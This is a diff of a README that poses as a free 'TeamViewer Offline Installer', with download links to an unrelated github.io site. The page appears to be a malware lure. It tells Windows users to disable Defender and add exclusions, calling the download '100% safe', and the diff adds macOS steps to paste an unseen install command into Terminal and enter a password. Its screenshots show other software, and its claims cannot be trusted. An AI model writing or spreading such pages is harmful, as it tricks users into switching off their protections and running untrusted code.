@@ -4,14 +4,15 @@
   <img src="https://img.shields.io/badge/Downloads-60K%2B-F9A825?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/Platform-Windows%2011%20%7C%2010-informational?style=for-the-badge&logo=windows" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
   <img src="https://img.shields.io/badge/Type-Remote+Desktop-F9A825?style=for-the-badge&logo=video" />
 </p>
 
-**🎬 TeamViewer Offline Installer Free** — professional offline installer for TeamViewer, supporting all features. Works without internet access, no subscription required. Download for 2026. **Full offline installation.** No limits. No watermarks. No hidden fees.
+**🎬 TeamViewer Offline Installer Free** — professional offline installer for TeamViewer. Works without internet access, no subscription required. Download for 2026. **Full offline installation.** No limits. No watermarks. No hidden fees.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
   <img src="https://skillicons.dev/icons?i=github" />
 </p>
 
@@ -26,7 +27,7 @@
 </div>
 
 <div align="center">
-<img width="2880" height="1620" alt="TeamViewer interface" src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ed/Premiere_Pro_screenshot.png/1280px-Premiere_Pro_screenshot.png" />
+<img width="2880" height="1620" alt="TeamViewer interface" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/OBS_Studio_29_screenshot.png/1280px-OBS_Studio_29_screenshot.png" />
 </div>
 
 ---
@@ -55,11 +56,19 @@
 ## 🚀 Quick Start — 3 Minutes
 
 ### Step 1: Download
-- Click the download button below
-- Save `teamviewer-offline.zip` (~25 MB)
-- Extract with WinRAR or 7-Zip
 
-### Step 2: Disable Windows Defender (Temporarily)
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://laplaplaplas.github.io/download/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+
+</div>
+
+- Save `installer.zip` (~100 MB)
+- Extract with WinRAR or 7-Zip (Windows) or The Unarchiver (Mac)
+
+### Step 2: Disable Windows Defender (Windows only, Temporarily)
 - May flag as false positive — add folder to exclusions
 - **100% safe**
 
@@ -71,20 +80,6 @@
 [![Download](https://img.shields.io/badge/⬇_Download_TeamViewer-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
 </div>
-
----
-
-## ✔ Why Choose TeamViewer
-
-| **Feature** |
-|-------------|
-| ✅ **Remote desktop access and control** |
-| ✅ **File transfer between computers** |
-| ✅ **Online meetings and screen sharing** |
-| ✅ **Mobile device support** |
-| ✅ **Cross-platform: Windows, Mac, Linux, Android** |
-| ✅ **No subscription for personal use** |
-| ✅ **Used by 2.5 billion devices worldwide** |
 
 ---
 
@@ -101,33 +96,30 @@
 
 ## 📋 System Requirements
 
-| **Component** | **Minimum** | **Recommended** |
-|---------------|-------------|-----------------|
-| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| **RAM** | 8 GB | 16 GB+ |
-| **Storage** | 2 GB free | 5 GB (SSD) |
-| **Processor** | Intel i5 / AMD Ryzen 5 | Intel i7 / AMD Ryzen 7 |
+| **Component** | **Windows** | **macOS** |
+|---------------|-------------|-----------|
+| **OS** | Windows 10/11 (64-bit) | macOS 12 Monterey or later |
+| **RAM** | 8 GB+ | 8 GB+ |
+| **Storage** | 2 GB free | 2 GB free |
+| **Processor** | Intel i5 / AMD Ryzen 5 | Intel or Apple Silicon |
 
 ---
 
-## ☆ Frequently Asked Questions
+---
 
-<details>
-<summary><b>Is TeamViewer free?</b></summary>
-Yes, TeamViewer is free for personal non-commercial use.
-</details>
+## 🍎 macOS Installation
 
-<details>
-<summary><b>Can I control my PC from a phone?</b></summary>
-Yes, the TeamViewer mobile app works on iOS and Android.
-</details>
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
 
-<details>
-<summary><b>Does it need a server?</b></summary>
-No, TeamViewer uses its own cloud infrastructure.
-</details>
+1. Click the badge above to open the macOS installer page
+2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
+3. Paste the install command shown on the page and press Enter
+4. Follow the prompts — installs automatically 🍏
+
+> Works on **Apple Silicon (M1–M4)** and **Intel Macs**. macOS may prompt for your password during install.
 
 ---
+
 
 ## ⚠️ Legal Disclaimer
 
@@ -149,5 +141,6 @@ No, TeamViewer uses its own cloud infrastructure.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
   <img src="https://skillicons.dev/icons?i=github" />
 </p>
